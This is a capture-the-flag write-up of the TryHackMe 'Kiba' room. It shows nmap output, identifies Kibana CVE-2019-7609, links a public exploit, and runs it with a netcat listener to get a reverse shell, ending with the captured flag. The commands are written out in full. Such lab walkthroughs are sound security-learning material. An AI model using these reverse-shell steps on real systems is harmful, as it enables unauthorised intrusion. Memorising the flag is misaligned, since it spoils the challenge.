<p align="center"><p align="center">April 7, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{337}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
  <img width="160px" src="https://github.com/user-attachments/assets/fd531592-487b-4cb5-8259-63887615d678"></p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Kiba}}$$</h1>


<p align="center">Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution. It is classified as an easy-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click <a href="https://tryhackme.com/room/kiba">Kiba</a>.</p>

<p align="center"> <img width="900px" src=""> </p>

<br>
<br> It is classified as an easy-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click <a href="https://tryhackme.com/room/kiba">Kiba</a>.</p>

<p align="center"> <img width="900px" src=""> </p>

<br>
<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>


<p align="center">There are have 3 ports open: <code>ssh/22</code>, <code>http/80</code> and <code>esmagent?/5601</code>. </p>

```bash
:~# nmap -sC -sV -sS -O -A -Pn -p- TargetIP
...
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Tue, 08 Apr 2025 00:53:49 GMT
|_    {"statusCode":404,"error":"Not Found"}
...
```

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Kibana}}$$</h2>
<p>Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw.</p>




<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Navigated to http://TargetIP:5601}}$$</h2>

![image](https://github.com/user-attachments/assets/db494326-46c0-418c-81ca-4aaaf48f54f7)

<br>

![image](https://github.com/user-attachments/assets/4bdaf403-5030-4c5e-adb1-66183ce154ac)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{CVE-2019-7609}}$$</h2>

https://nvd.nist.gov/vuln/detail/cve-2019-7609

![image](https://github.com/user-attachments/assets/0b3b8237-3715-4e9f-bf03-f73056bba5dd)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{Downloaded an exploit for CVE-2019-7609}}$$</h2>

https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/refs/heads/master/CVE-2019-7609-kibana-rce.py


<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Ran the exploit in Attack vm after setting up a listener}}$$</h2>

```bash
:~/kiba# ls
CVE-2019-7609-kibana-rce.py
:~/kiba# python CVE-2019-7609-kibana-rce.py -u http://TargetIP:5601 -host AttackIP -port AttackPort --shell
[+] http://10.10.25.155:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: AttackIP:AttackPort
:~/kiba# 
```

<br>

<h2 align="center">$$\textcolor{white}{\textnorma{Got the shell}}$$</h2>

```bash
:~/kiba# nc -lnvp 4444
...
kiba@ubuntu:/home/kiba/kibana/bin$ id
id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
kiba@ubuntu:/home/kiba/kibana/bin$ cd ..
cd ..
kiba@ubuntu:/home/kiba/kibana$ cd ..
cd ..
kiba@ubuntu:/home/kiba$ ls
ls
elasticsearch-6.5.4.deb
kibana
user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
kiba@ubuntu:/home/kiba$ 
```




